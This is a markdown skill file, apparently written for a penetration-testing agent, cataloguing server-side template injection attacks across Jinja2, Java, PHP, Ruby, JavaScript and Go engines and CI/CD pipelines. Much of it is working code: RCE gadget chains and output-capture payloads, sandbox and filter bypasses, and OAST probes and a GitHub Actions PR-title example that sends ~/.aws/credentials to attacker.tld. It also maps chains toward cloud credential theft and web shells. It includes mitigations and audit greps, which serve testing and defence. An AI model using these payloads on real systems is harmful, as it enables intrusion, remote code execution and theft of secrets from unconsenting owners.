---
name: ssti
description: Server-side template injection across Jinja / Mako / Velocity / Freemarker / Thymeleaf / Twig / Handlebars / EJS / ERB / Smarty / Blade / Go text-and-html-template / Razor / Scriban / Liquid, plus SSTI+LLM prompt-template crossover, framework-layer SSTI (Flask / Django / Express / SpEL), and CI/CD expression injection. Covers engine fingerprinting, sandbox escape, RCE gadget chains, confirmation without RCE, and the Jinja2 Environment vs SandboxedEnvironment differential as the class's canonical framing.
---

# Server-Side Template Injection

SSTI happens when user input reaches a template engine as syntax instead of as data — `{{user_input}}` rendered through Jinja, `${user_input}` through Velocity / SpEL, `<%= user_input %>` through ERB / EJS. The eventual impact is almost always RCE because template engines are designed to evaluate expressions and most leak access to the host language's runtime (Python builtins, Java reflection, JavaScript prototypes). The discovery cost is low — a `{{7*7}}` probe — but the gadget chain to RCE differs sharply per engine, so engine fingerprinting is the load-bearing step.

The canonical framing for this class is the **`Environment` vs `SandboxedEnvironment` differential** in Jinja2 — a distinction that generalizes to every template engine with an optional sandbox mode. Jinja2's `Environment` provides full attribute access on template variables; `SandboxedEnvironment` blocks attributes starting with underscore (`__class__`, `__mro__`, `__globals__`) and blocks unsafe callables (methods annotated with `alters_data`). The primitive difference is which reflection surface is reachable from the template context: `Environment` exposes the full Python object graph via `__class__` walks; `SandboxedEnvironment` blocks the direct walk but leaves filter-and-attribute-lookup paths that historically re-open the surface (the `|attr` filter → `str.format` bypass class, CVE-2025-27516). Every template engine has an analogous differential: Twig's default vs sandbox extension; FreeMarker's `UNRESTRICTED_RESOLVER` vs `ALLOWS_NOTHING_RESOLVER` / `SAFER_RESOLVER`; Velocity's default `UberspectImpl` vs `SecureUberspector`; Smarty's default vs `SmartySecurity`. When auditing, the load-bearing question is not "is this engine safe?" but "which mode is this instance configured in, and what surface does that mode expose?" Load `ssti_novel_deep.md § Jinja2 |attr Filter Sandbox Escape — CVE-2025-27516` for the canonical Jinja2 sandbox-bypass mechanism, and `ssti_advanced_deep.md § Engine Sandbox Comparison Table` for the cross-engine differential.

## Attack Surface

**Input shapes that reach the renderer**
- Form fields, query / path / header values, cookies, JSON / GraphQL variables
- Filenames and file metadata processed by document / report templates
- Email subject / body / template-selector fields
- Theme / customization endpoints (CSS / HTML generation, dashboard widgets, webhook payload templates)
- Markdown / WYSIWYG content rendered through a templating layer downstream

**Code patterns that enable injection**
- User input concatenated into a template string before `render(template_str)` instead of passed as a context variable to `render(template_obj, context)`
- "Template editor" features for tenants / admins where the *template itself* is user-controllable
- `format()` / `sprintf()` / printf-style chains with user-controlled format string downstream of a template
- YAML / TOML / JSON values whose strings are later evaluated through a template

**Engines in scope**
- Python: Jinja2, Mako, Django (limited)
- Java: Velocity, Freemarker, Thymeleaf (with SpEL), JSP EL
- JS / Node: Handlebars, Nunjucks, EJS, Pug, Marko, Dust
- Ruby: ERB, Haml, Slim
- PHP: Twig, Smarty, Blade
- .NET: Razor, RazorEngine

## High-Value Targets

- Email rendering pipelines (subject / body / "from" templates)
- PDF / report generators (server-side render → headless browser)
- CMS theme and plugin editors
- Webhook and notification payload templates
- API response formatters that interpolate strings (pagination labels, error messages, custom field renders)
- Admin / tenant template editors — explicit "edit your template" features

## Reconnaissance

### Injection Points

- Submit a benign string and grep responses (HTML, JSON, emails, PDFs) for verbatim reflection
- Anywhere user input ends up in a value that's clearly being templated (preview panes, "your message will look like…" panels) is high-signal
- Check error pages — many engines leak template syntax in stack traces

### Engine Fingerprinting

The classic differential probe — most engines evaluate exactly one of these, identifying themselves:

| Probe | Renders to | Engine family |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2 / Twig / Nunjucks |
| `{{7*'7'}}` | `7777777` (Jinja) or `49` (Twig) | distinguishes Jinja from Twig |
| `${7*7}` | `49` | Velocity / Freemarker / SpEL / JSP EL / Thymeleaf |
| `<%= 7*7 %>` | `49` | ERB / EJS |
| `#{7*7}` | `49` | Pug / some Ruby contexts |
| `{{= 7*7 }}` | `49` | doT.js |

For Thymeleaf specifically, the `*{...}` selection-expression form also evaluates but only inside a `th:object` scope; `${...}` is the universal probe.

Secondary signals: error message text (engine name in stack trace), comment-syntax differential (`{# #}` Jinja vs `<%# %>` ERB vs `{* *}` Smarty), filter syntax (`|` vs `:` vs space).

### Blind Probes

When output isn't reflected:

- **Time-based**: payload that triggers a sleep on the host language (`{{''.__class__.__mro__[1].__subclasses__()[<idx>](...)}}` for Jinja, `${T(java.lang.Thread).sleep(5000)}` for SpEL, `<%= sleep(5) %>` for ERB)
- **OAST**: payload that performs a DNS lookup or HTTP fetch to attacker infrastructure (`{{request.application.__globals__.__builtins__.__import__('socket').gethostbyname('x.attacker.tld')}}`)
- **Length / ETag diff**: payload whose evaluation changes the body length, even if the value isn't directly visible

## Key Vulnerabilities

### Jinja2 / Mako (Python)

The classic Python class walk — every object exposes its method-resolution-order, which leads to `object`, which exposes every subclass loaded in the interpreter, which includes things like `subprocess.Popen`:

```jinja
{{''.__class__.__mro__[1].__subclasses__()}}
```

Locate a useful subclass and call it. Common gadgets when builtins are reachable through globals:

```jinja
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Sandbox bypass: even with `SandboxedEnvironment`, attribute-lookup tricks (`|attr('__class__')`) and `request.environ` access can re-introduce reachability. Check whether the app exposes `request`, `config`, `cycler`, or any framework global into the template context.

**Capturing stdout from the subclass walk.** The globals gadgets above already return output via `.read()`; the subclass-walk path does not. `subclasses()[N](['cat','/target'])` runs the command but returns an opaque `<Popen: returncode: None args: [...]>` — RCE proven, output gone to the app's stdout, not the response. Capture it back into the template. Indices below are from Python 3.14 and **shift with version and loaded libraries** — enumerate, never hardcode:

```jinja
{{''.__class__.__mro__[1].__subclasses__()}}   {# grep the response for 'Popen' / '_wrap_close' to get the offset #}
```

Popen + `communicate` — the reliable workhorse. `stdout=-1` is `subprocess.PIPE`; `communicate()[0]` is bytes, so `.decode()` drops the `b'...'` wrapper:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[N](['cat','/target'],stdout=-1).communicate()[0].decode() }}
```

os.popen — shorter, and its class is easier to locate: `subprocess.Popen` only enters the subclass list once the app has imported `subprocess`, but `os._wrap_close` is always present (`os` is always imported). Reach `os.popen` through that class's globals — `_wrap_close(cmd)` itself is not callable, it is the *return* type of `os.popen`:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[M].__init__.__globals__['popen']('cat /target').read() }}
```

Two-request write-and-read — use when the direct payload exceeds a URL/parameter length cap or the endpoint truncates the response body. Write with Popen, then read in a later request through the same class's builtin `open`:

```jinja
{# request 1 #} {{ ''.__class__.__mro__[1].__subclasses__()[N](['sh','-c','cat /target > /tmp/o']) }}
{# request 2 #} {{ ''.__class__.__mro__[1].__subclasses__()[M].__init__.__globals__['__builtins__']['open']('/tmp/o').read() }}
```

`M` is the `_wrap_close` offset. Encoding: in an HTML-autoescape context the captured output is HTML-encoded (`<`/`>`/quotes escaped, `\x00`→`&#0;`) but text stays readable; `{{7*7}}`→`49` does not reveal autoescape state, so send a probe with distinct characters and check the response for encoding before trusting a clean read. Pick the variant: `communicate` for general 3.x reliability, `os.popen` when the `subprocess.Popen` index is hard to find, write-and-read when length or truncation blocks direct capture.

### Velocity / Freemarker / Thymeleaf (Java)

SpEL (Spring Expression Language) — used by Thymeleaf and various Spring components — reaches `Runtime` via the `T()` type operator. Note that `Runtime.exec()` returns a `java.lang.Process` object whose `toString()` is `"Process[pid=...]"`, **not** the command's stdout. To get reflected output you need to consume the process's `InputStream`:

```spel
${T(java.lang.Runtime).getRuntime().exec('id')}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

The first form confirms execution (rendered Process object proves the call ran); the Scanner form is universally available; the `IOUtils` form is shorter when Apache Commons IO is on the classpath. For blind contexts, validate via OAST or sleep.

Freemarker's `freemarker.template.utility.Execute` is the canonical RCE gadget when not denylisted, and unlike `Runtime.exec` it returns the command output as a string directly:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

Velocity gadgets typically don't have `$Runtime` in context — that's not a standard Velocity built-in. The portable approach is string-class reflection from any reachable object:

```velocity
#set($s = "")
#set($r = $s.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null))
$r.exec("id")
```

This requires the default `UberspectImpl` (Velocity 1.x and Velocity 2.x without `SecureUberspector`); same `Process.toString()` caveat applies — capture stdout via `Scanner` or `BufferedReader` if reflected output is needed. If the application uses Velocity Tools, `$class` (a `ClassTool`) is often in scope and shortens the chain considerably.

Thymeleaf SSTI requires control over the *template source*, not just over a model variable bound into the template — normal Spring MVC binding renders `${userInput}` as a value, never re-evaluated as SpEL. The exploitable surface is `templateEngine.process(userControlledString, ctx)`, admin-editable email / notification templates, and template fragments composed from user input. When that surface exists, the same SpEL payloads apply:

```html
<div th:utext="${T(java.lang.Runtime).getRuntime().exec('id')}"></div>
<div th:utext="${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}"></div>
```

Confusing this with normal model binding produces false positives — confirm the template source itself is attacker-influenced before flagging.

### Smarty / Twig / Blade (PHP)

Twig sandbox bypasses are version-specific. The canonical historical gadget (Twig 1.x) registered `system` as an undefined-filter callback, then invoked it through the filter pipeline:

```twig
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

This was patched — in Twig 2.x / 3.x `_self` returns the template name as a string and no longer exposes `.env`. Modern bypasses depend on which extensions are loaded and the active sandbox policy; consult Twig's published security advisories for the current state and probe with the version-specific gadgets (filter/function abuse, reflection on `_context` in some configs).

**Autoescape defeats the naive `{{7*7}}` probe.** Twig's default `autoescape: html`
encodes template *output* after evaluation, not the evaluation itself: `{{7*7}}`
still evaluates, but the result `49` has no HTML-special characters, so it renders
as `49` — indistinguishable from a literal `49`. Disambiguate with probes whose
output cannot be a coincidence:
- `{{'a' ~ 7*7}}` → `a49` (string concat; unmistakable)
- `{{['a','b']|join('-')}}` → `a-b`; `{{'x'|upper}}` → `X`; `{{7|abs}}` → `7`

Read the raw response body, not the rendered page. Interpreting the result: `49`
or `a49` = **confirmed SSTI regardless of autoescape**; a literal `{{7*7}}`
returned = the input is not reaching a Twig context (or `strict_variables`
rejected it); braces returned HTML-entity-encoded = an HTML escaper ran on your
input in a **non-template** context, not SSTI.

`{{ user_input|raw }}` disables autoescape for that output, so a field rendered
through `|raw` is exploitable even in an autoescaped template — grep source for
`|raw` on user-controlled paths. `template_from_string(...)` (from
`StringLoaderExtension` — optional in plain Twig but registered by default in
Symfony) evaluates an arbitrary string as a template, a direct SSTI→RCE lever
where reachable; confirm whether that extension is loaded rather than assuming.
The **sandbox extension** whitelists permitted tags/filters/methods; where it is
active, `_self.env`/`template_from_string` escalation is blocked — detect it by
comparing an allowed construct against a disallowed one and watching for
consistent whitelist rejection.

Smarty `{php}...{/php}` was the historical RCE primitive; deprecated in Smarty 3 and removed in 4. On modern Smarty, the surface is static-method invocation and template-object reflection — `{$smarty.template_object->smarty->...}` walks back to the Smarty engine, and direct static calls on whitelisted classes (e.g. `{Smarty_Internal_Write_File::writeFile(...)}` on misconfigured installs) reach the filesystem. Probe both before assuming Smarty is hardened.

Blade (Laravel) compiles templates to PHP on first render and caches the compiled output, so the dangerous paths are runtime: `Blade::render($userControlledString, ...)`, `Blade::compileString(...)` with user input, or any reachable `@php ... @endphp` block whose body is composed from user input — all three are direct RCE.

### ERB / Haml (Ruby)

Direct Ruby evaluation — backticks are the shortest path that *reflects* command output:

```erb
<%= `id` %>
<%= IO.popen('id').read %>
<% require 'open3'; out, _ = Open3.capture2('id'); %><%= out %>
<%= system('id') %>
```

The first three render the command's stdout into the response. `system('id')` returns `true`/`false` and prints the command output to the *server's* stdout, not the HTTP body — useful for confirming execution succeeded but not for capturing output. Pair with OAST or a side-effect (file write, DNS lookup) when the response doesn't reflect anything.

Haml is the same risk surface in different syntax. `instance_eval` / `class_eval` chained off any reachable object becomes RCE.

### Handlebars / Nunjucks / EJS (JavaScript)

EJS evaluates inline JavaScript:

```ejs
<%= require('child_process').execSync('id').toString() %>
```

Nunjucks via constructor walk on reachable objects:

```nunjucks
{{range.constructor("return require('child_process').execSync('id')")()}}
```

Handlebars itself is harder (default helpers are restricted), but custom helpers that pass arguments to `eval`, `Function`, or `child_process` re-open the surface. Also probe for prototype pollution as an SSTI amplifier — once `Object.prototype` is polluted, downstream template logic may execute attacker-controlled code paths.

The **Handlebars March 2026 wave** (eight advisories published on the same day) established a new frontier of JS-injection-via-AST-type-confusion attacks in `Handlebars.compile` and related APIs. The class shape is that Handlebars templates compile to JS functions, and the compile-time AST validation can be steered to accept templates with dangerous constructs (`@partial-block` reference to dynamic partials, `container.lookup` bypass, prototype-pollution via partial injection). Load `ssti_novel_deep.md § Handlebars March 2026 Wave` for the mechanism decomposition and the eight-advisory catalog.

### Go `text/template` vs `html/template`

Go's stdlib has two template packages with different safety postures. `text/template` — the docs verbatim state "The package does not auto-escape output, so injecting code into a template can lead to arbitrary code execution if the template is executed by an untrusted source." The "arbitrary code execution" clause is because `text/template` allows arbitrary method invocation on the data model; a template that reaches a method returning a `func` type, or invoking a method with side effects, executes host-language code. `html/template` — the same syntax but auto-escapes output based on context detection (HTML/URI/JS/CSS). The escape hatch is any use of the typed strings `template.HTML(user)`, `template.JS(user)`, `template.URL(user)`, `template.CSS(user)`, `template.JSStr(user)`, `template.Srcset(user)` — the docs explicitly warn each is a security risk when the encapsulated content is untrusted.

Grep patterns for Go targets:
- `template.ParseFiles(userPath)` — template-source injection.
- `template.New("").Parse(userString)` — template-source injection.
- `template.HTML(user)`, `template.JS(user)` — escape-hatch usage; each is a suspect sink.

### SSTI+LLM crossover — the emerging class

A new pattern in 2024–2026: LLM-tooling libraries that use Jinja2 to compose prompts, but instantiate `jinja2.Environment()` directly rather than `SandboxedEnvironment`. When user input reaches the prompt template as a variable, the classical Jinja SSTI class becomes reachable in the LLM-orchestration tier. Three confirmed CVEs in this class share the same root cause:

- **banks (LLM prompt library)** — CVE-2026-44209; unsandboxed Jinja2 environment in `src/banks/env.py`; user-controlled `Prompt(user_input)` reaches `{{ self.__init__.__globals__.__builtins__.__import__('os').popen(...) }}` gadgets. Fixed by switching to `SandboxedEnvironment`.
- **Haystack** — CVE-2024-41950; same class shape.
- **spacy-llm** — CVE-2025-25362; same class shape.

The class expression: LLM applications compose prompts from templates because prompt engineering is inherently a templating problem. Library authors default to `Environment()` because it is the documented API surface; the security-conscious choice is `SandboxedEnvironment` but adoption lags. Any LLM-adjacent library that renders user data through Jinja2 is a candidate for this class.

Load `ssti_novel_deep.md § SSTI+LLM Crossover — The Environment vs SandboxedEnvironment Regression` for the mechanism-per-library decomposition, the version tables, and the class abstraction extrapolation to LangChain / LlamaIndex / semantic-kernel and other LLM frameworks not yet audited against this class.

## Framework-Layer SSTI

Beyond direct engine-level SSTI, several framework APIs are themselves SSTI sinks when user data reaches them:

- **Flask `render_template_string(user_input)`** — direct Jinja2 SSTI sink. Any Flask route that takes user input and passes it to `render_template_string` is a first-tier finding.
- **Django `Template(user_input)`** — Django's template engine is generally safer than Jinja2 (no `__class__` walk), but `Template(user_input).render(context)` still evaluates user template syntax, and the context's model methods reach reflection.
- **Express `res.render(userViewName)`** — if the view name is attacker-controlled, path traversal into arbitrary template files becomes SSTI on any file the traversal reaches.
- **Spring `@Value("#{...}")`** — SpEL expressions in `@Value` annotations are compile-time; runtime user input reaches SpEL when the app uses `SpelExpressionParser.parseExpression(userInput).getValue(context)`. This is a direct SSTI-to-RCE surface with the full `T(java.lang.Runtime)...` gadget catalog.
- **Spring `PathVariable` reaching `@ConditionalOnExpression`** — indirect but real.
- **Symfony Twig `render_string()`** or `TwigEngine::render` with a `template_from_string` extension enabled — the equivalent of Flask's `render_template_string`.

Grep patterns for framework-layer sinks:
```
grep -rn 'render_template_string\|Template(\|res\.render(' src/
grep -rn 'SpelExpressionParser\|parseExpression' src/
grep -rn 'template_from_string' src/
```

## CI/CD Expression Injection

A related class shape landed as a distinct 2024–2026 frontier: CI/CD pipelines that interpolate expressions containing attacker-influenced values. Not classical SSTI but the same "trusted evaluator + attacker input" primitive.

- **GitHub Actions expression injection** — `${{ github.event.pull_request.title }}`, `${{ github.event.pull_request.head.ref }}`, `${{ github.event.commits[0].message }}` interpolated directly into `run:` shell scripts. The evaluator (Actions expression parser) inserts the raw string into the shell command before execution; attacker-controlled branch names or PR titles containing shell metacharacters execute. The mitigation is env-var indirection: bind the value to a `TITLE:` env var and reference `$TITLE` in the shell script, so the shell handles the escaping.
- **Argo Workflows template-reference bypass** — a 2026 cluster (CVE-2026-31892 → 42296 → 54526) where attacker-supplied fields in `podSpecPatch` / `ArtifactGC` escape the Strict/Secure template-reference allow-list.
- **Jenkins Groovy templating** — pipelines defined via `Jenkinsfile` with `groovy.text.GStringTemplateEngine` or Jenkins-specific templating; user input in a build parameter reaches Groovy evaluation.
- **Ansible Jinja2 in playbooks** — variable content re-templated on the control node; attacker-controlled facts that contain Jinja2 syntax can be evaluated in the wrong context.
- **GitLab CI expression contexts** — `${{ ... }}`-shape interpolation in `.gitlab-ci.yml`.

Detection: audit the CI/CD workflows for direct interpolation of any `${{ github.event.* }}`, `${{ github.head_ref }}`, or equivalent attacker-controllable value into `run:` blocks. GitHub's own security-hardening docs establish env-var indirection as the standard mitigation.

**Vulnerable pattern**:
```yaml
- name: Comment
  run: |
    echo "Received: ${{ github.event.pull_request.title }}"
```
An attacker submits a PR with title `foo"; curl https://attacker.tld/exfil -d "$(cat ~/.aws/credentials)"; echo "` — the shell expansion runs after the expression evaluator inserts the raw string.

**Mitigated pattern**:
```yaml
- name: Comment
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Received: $TITLE"
```
Now `$TITLE` is a shell variable containing the raw string; shell metachars in it are treated as data, not code.

**Specific 2024 GHSL cases with mechanism**:
- **GHSL-2024-051 (Misskey)** — expression injection via `${{ github.event.pull_request.head.ref }}` in a Storybook workflow. PoC branch name: `develop";echo${IFS}"hello";#`. Fixed April 2024.
- **GHSL-2024-277 (Appsmith)** — injection via `github.event.commits[0].message`. Fixed October 2024.
- **Ultralytics Actions expression injection** — composite step interpolates `${{ github.event.pull_request.head.ref }}` and `${{ github.head_ref }}` into `run:`. PoC branch: `Hacked";{curl,attacker.tld}|bash`. Load `ssti_novel_deep.md § CI/CD Expression Injection — The 2024–2026 Frontier` for the exact GHSA ID and version boundaries.

**`pull_request` vs `pull_request_target`** — `pull_request` runs in the PR-source branch context and does not have secrets access (GitHub's default). `pull_request_target` runs in the base-branch context with secrets access; a PR that triggers `pull_request_target` and reaches an expression-injection sink has full write access to the repo. The finding severity is much higher on `pull_request_target` triggers.

Load `ssti_novel_deep.md § CI/CD Expression Injection — The 2024–2026 Frontier` for the per-platform CVE list, the GitHub Actions expression-parser mechanism, and the Argo template-reference bypass sequence.

## Engine-Specific Depth

### Additional JS-engine detail

**EJS** — beyond `<%= require('child_process').execSync('id') %>`, the historical **`outputFunctionName` option injection** (CVE-2022-29078 lineage) reaches RCE via the `opts.outputFunctionName` parameter when the app allows attacker-controlled EJS options. If EJS is on a pre-3.1.7 version, this remains the direct path. Any modern EJS deployment where the app calls `ejs.render(template, data, options)` with `options` sourced from user input should be tested for the `outputFunctionName` shape.

**Nunjucks** — the class-walk via any reachable object. `range.constructor("...")` is the canonical entry; alternatives include `''.constructor.constructor("...")()` (JavaScript String → Function constructor walk). Nunjucks autoescape is on by default but only for output, not for expression evaluation.

**Handlebars** — the March 2026 wave established several class shapes worth naming at base depth:
- **AST-type-confusion in `compile`** (Critical) — the compile step accepts an AST that misrepresents its node types; the generated function includes attacker-controlled JavaScript.
- **`@partial-block` reference to dynamic partials** — the block's target is looked up at render time; a user-controlled partial name reaches unexpected registered partials.
- **CLI precompiler unescaped names/options** (High) — the `handlebars-precompiler` CLI takes template names as CLI args and forwards them to the compiled output unescaped; attacker-controlled build-time input reaches the output.
- **Prototype pollution → XSS via partial injection** (Moderate).
- **Missing `__lookupSetter__` blocklist** (Moderate).

Load `ssti_novel_deep.md § Handlebars March 2026 Wave` for the eight-advisory catalog with mechanism per each.

### Additional Java-engine detail

**Freemarker post-2.3.30 `?api` builtin** — the `?api` conversion allows a template to call Java API methods on a variable that would otherwise be restricted by the template model. Post-2.3.30 this is disabled by default; earlier versions allow the escape. Grep for `<setting name="api_builtin_enabled">true</setting>` in Freemarker configs.

**Velocity Tools** — if the deployment uses Velocity Tools, `$class` (a `ClassTool`) is often in scope and provides one-hop reflection: `$class.inspect('java.lang.Runtime').getRuntime().exec(...)`.

**Thymeleaf mode differences** — Thymeleaf supports HTML, XML, TEXT, JAVASCRIPT, CSS, RAW modes. In HTML mode, `th:utext` renders unescaped text; in TEXT mode (used for email templates), the escape rules differ. Preprocessing (`__${...}__`) is a two-phase eval: the inner expression is evaluated first, and its string result becomes part of the outer expression. A user-controlled inner expression that produces `T(java.lang.Runtime).getRuntime().exec('id')` becomes the outer SpEL to evaluate.

### Additional PHP-engine detail

**Smarty 4+/5 sandbox history** — the `SmartySecurity` class allowlists tags, filters, functions, modifiers, php-tags, static-classes, php-functions, php-modifiers, streams. The default policy is permissive; a strict deployment needs explicit configuration. The `secure_dir` property gates which directories `{include}` can reach. Smarty CVEs across 2024–2026 target specific bypasses: `{extends}` PHP-code injection (2024-05), `{fetch}` SSRF via `trusted_uri` redirect (2026-07), symlink traversal (2026-07), `stream:` resource bypassing SmartySecurity (2026-07). Load `ssti_novel_deep.md § Smarty 2024–2026 Cluster` for the per-CVE mechanism.

**Twig sandbox extension** — `SecurityPolicy(allowedTags, allowedFilters, allowedFunctions, allowedMethods, allowedProperties, allowedTests)` enforces an allow-list; `setStrict(true)` fails-loud on violations. Any deployment without the sandbox extension configured is exposed to the classical `_self.env.registerUndefinedFilterCallback("exec")` gadget (or its modern variants). The Grav CMS cluster (CVE-2024-28118, CVE-2024-28119, CVE-2025-66294) is Twig-specific — Grav exposes Twig-engine access at unsafe surfaces even inside its sandbox configuration.

### Ruby engines

**ERB `safe_level` deprecated in Ruby 3** — `ERB.new(str, safe_level: N)` was the historical sandboxing mechanism; the docs explicitly state "Passing safe_level with the 2nd argument of ERB.new is deprecated. Do not use it." Ruby 3 removed `$SAFE` globally. On Ruby 3+ ERB has no built-in sandbox; treat any user-controlled ERB template as arbitrary Ruby.

**Slim / Haml** — same class as ERB; templates compile to Ruby methods. `instance_eval` / `class_eval` reachable from any template object.

**Liquid (Shopify)** — designed as a safe subset. No arbitrary code, no filesystem access, no shell. The API surface is deliberately restricted; Liquid templates cannot escape to Ruby. This is the class exemplar for "safe-by-design" template engines.

## Bypass Techniques

**Sandbox escape — generic patterns**
- **Attribute lookup instead of direct access**: `{{x.__class__}}` blocked? try `{{x|attr('__class__')}}`
- **Class walk to recover deleted builtins**: `{{[].__class__.__base__.__subclasses__()}}` enumerates everything loaded
- **String constructor games**: `'__import__'.__class__` etc., when literal `__import__` is filtered
- **Filter / function aliasing**: same callable reachable via different names — find one not on the denylist
- **Implicit conversion**: object whose `__str__` / `toString` triggers code, coerced via concatenation

**Filter and parser evasion**
- Whitespace / case variants in keywords: `{{7 *7}}`, `{{ 7*7 }}`, `{{7*7}}`
- String concatenation to assemble denylisted identifiers: `{{('__cl'+'ass__')}}`, `{{request|attr('__cl'~'ass__')}}` — splits a token without a comment (Jinja's lexer doesn't recognize `{#` inside expression mode, so SQL-style `/**/` token splitting doesn't work here)
- Encoding layering: payload arrives URL-encoded, JSON-decoded, then template-rendered — pick the encoding that survives the filter but is decoded before render
- Operator precedence games: `((7)*(7))`, `7**7`, `7+0+7`
- Null byte truncation: `{{x%00.evil}}` — terminates payload for some pre-template filters but not the template parser
- Unicode normalization: smart quotes, fullwidth digits — bypasses naive denylists, normalizes back during render

**Polyglot and chained evaluation**
- Multi-engine pipelines: output of engine A feeds engine B — craft payload valid in both, or escape A and inject for B
- Markdown / RST embedded in a template — Markdown parser may strip your payload, but a code block survives and reaches the template
- Format string → template: printf-style format applied before template render; payload that's inert as a format string but live as a template

## RCE Primitives

**Direct command execution by language**
- Python: `os.system`, `os.popen`, `subprocess.run`, `subprocess.Popen`, `__import__('os').system`
- Java: `Runtime.getRuntime().exec`, `ProcessBuilder`, `freemarker.template.utility.Execute`
- Ruby: backticks, `system`, `exec`, `Open3.capture2`, `IO.popen`, `%x{}`
- JavaScript / Node: `require('child_process').execSync` / `exec` / `spawn`; `require.main.require(...)` when nested module loading is needed (`process.mainModule` is the older form, deprecated since Node 14 but still present in most CJS contexts)
- PHP: `system`, `passthru`, `exec`, `shell_exec`, backticks, `popen`

**Indirect / second-stage**
- File write to webroot → trigger via subsequent HTTP request (when shell exec is blocked but file write isn't)
- Define a function / macro inline that runs on next render
- Unsafe deserialization gadget invoked through template (Java `ObjectInputStream`, Python `pickle`, PHP `unserialize`)
- DNS / HTTP exfiltration when shell exec produces no observable output

## Confirmation Without RCE

Between "found the sink" and "proved RCE" there are safer intermediate proofs — the same ladder that applies in deserialization but with template-specific probes.

1. **Evaluation confirmation** — `{{7*7}}` → `49`, `{{7*8}}` → `56`. The second probe rules out coincidence. Confirmed evaluation is the class-membership proof.
2. **Engine fingerprint** — the differential probes distinguish Jinja/Twig/Nunjucks (`{{...}}`), Velocity/Freemarker/SpEL (`${...}`), ERB/EJS (`<%=...%>`), Pug (`#{...}`). Fingerprinted engine narrows the payload catalog.
3. **Sandbox-state probe** — try to access engine-specific globals: `{{self}}` / `{{config}}` / `{{request}}` (Jinja), `${T(java.lang.Class)}` (SpEL), `<%= self %>` (ERB). A reachable global is the gadget seed.
4. **Reflection probe** — `{{''.__class__}}` (Jinja) / `{{"foo".class}}` (some engines) / `${''.getClass()}` (Freemarker) — proves the engine exposes host-language reflection.
5. **File-read primitive** — `{{ get_flashed_messages.__globals__['__builtins__']['open']('/etc/hostname').read() }}` (Flask-Jinja) / equivalent in each engine. Proves file-system access without exec.
6. **Timing side channel** — `{{cycler.__init__.__globals__.__import__('time').sleep(5)}}` (Jinja) / `${T(java.lang.Thread).sleep(5000)}` (SpEL). Response-time shift confirms.
7. **OAST callback** — DNS resolution triggered from the gadget. Reachable in every engine with network access.
8. **Command exec (final)** — the RCE. Fire only after 1–7 have all landed cleanly.

The ladder is auditable: a report that jumps from `{{7*7}}=49` to `RCE PoC` is not verifiable without re-firing the destructive payload; a report that documents evaluation → fingerprint → sandbox → reflection → file-read → exec is reproducible with a safer regression payload.

**Autoescape-aware evaluation** — a page that renders `49` might be SSTI or might be a coincidence. Disambiguate with probes whose output cannot be coincidence: `{{'a' ~ 7*7}}` (string concat, output `a49`), `{{['a','b']|join('-')}}` (`a-b`), `{{'x'|upper}}` (`X`). If any renders as expected, SSTI is confirmed regardless of the specific engine.

**HTML-encoded output detection** — check whether the response body contains the raw evaluation result or an HTML-encoded version. Some sinks render into an HTML context where `<` / `>` / quotes are entity-encoded; a payload that outputs `<script>` renders as `&lt;script&gt;` in the response but the *evaluation* still ran. The finding is SSTI, not XSS, and the payload has to be adjusted to output non-HTML-special characters for clean reflection.

## Chaining

Every SSTI finding routes upstream and downstream. Route by filename.

**Upstream — capabilities that grant this primitive**:
- **Access to a template-source-editing feature** — CMS admin theme editor, tenant-configurable email template, webhook payload template. Route through `authorization.md` if the tenant boundary is the gate.
- **Cache poisoning that reaches a cached template** — route through `cache_poisoning.md` for the cache-write half; this file's SSTI section covers the render-time execution.
- **Prompt injection reaching an LLM-tooling library** — the SSTI+LLM crossover class above. Route the prompt-injection side to a prompt-injection resource; this file covers the template-evaluation half.
- **CI/CD parameter injection** — for the expression-injection class, the upstream is any endpoint that accepts a branch name / PR title / commit message from an untrusted user (a public GitHub repo with `pull_request_target` triggering CI, a webhook that lands in Argo). The CI expression-injection is downstream.

**Downstream — capabilities this primitive grants**:
- **RCE on the render host** — the default outcome. Route to `rce.md` for post-exec expansion (in-container recon, secret extraction, lateral movement).
- **Cloud metadata reach** — after RCE, the metadata endpoint is one HTTP call away. Route to `cloud/aws.md § IMDSv2 Credential Extraction`, `cloud/gcp.md`, `cloud/azure.md` per provider.
- **File-write to webroot** — persistence via web shell. Route to `rce.md § Post-Exec Persistence`.
- **Read of `.env` / config secrets** — credential harvest. Route to `information_disclosure.md`.
- **Lateral SSRF via server-side HTTP client** — the compromised render host can reach internal services. Route to `ssrf.md § IPv4/IPv6/DNS Rebinding` for the internal-reachability enumeration.
- **Post-render supply-chain compromise** — for build-time SSTI, the poisoned artifact ships to every downstream consumer. Route to `dependency_confusion.md` if the artifact is a package.

**Composite chains (concrete multi-hop paths, each hop routed)**:
- **Admin-tier template editor → template-source SSTI (this file) → RCE → cloud metadata → cloud role compromise** — the tenant-editor SSTI class.
- **User profile field with markdown rendering → template embedded via markdown plugin → SSTI → RCE** — the WYSIWYG-through-template class.
- **LLM prompt template with `Environment()` → user-controlled prompt variable containing `{{__class__.__mro__[1].__subclasses__()[N]}}` → RCE on LLM orchestration server** — the SSTI+LLM class (banks/Haystack/spacy-llm).
- **GitHub Actions PR title with shell-metachars → `run:` interpolation → command injection on CI runner → cloud credentials in `GITHUB_TOKEN` scope → org-level access** — the CI/CD expression-injection class.
- **Argo Workflow submitted via webhook with `podSpecPatch` bypass → template-reference allow-list escape → arbitrary pod launched in cluster → K8s tenant compromise** — the Argo 2026 CVE cluster.

Route by filename in every hop; the capability transferred at each arrow is the load-bearing detail.

## Post-Exploitation

